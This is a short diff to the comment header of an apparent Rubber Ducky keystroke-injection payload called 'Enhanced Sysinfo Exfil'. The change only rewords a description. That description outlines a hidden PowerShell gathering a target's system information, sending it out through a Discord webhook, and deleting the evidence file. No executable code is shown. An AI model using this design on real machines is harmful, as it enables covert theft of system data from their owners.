@@ -1,6 +1,6 @@
 REM Title: Enhanced Sysinfo Exfil
 REM Author: LulzAnarchyAnon
-REM Description: Gather enhanced system info using powershell, Ducky script and notepad. First hidden powershell is 
+REM Description: Gather enhanced system info using powershell, Ducky script and notepad. First a hidden powershell is 
 REM opened, and a script is ran to collect the target computers enhanced system information, Then a bit
 of Ducky script runs saving the exfilled info to a notepad txt file on the Desktop.
 REM It is then exfiltrated using a Discord webhook, and finally the txt file is removed from the Desktop
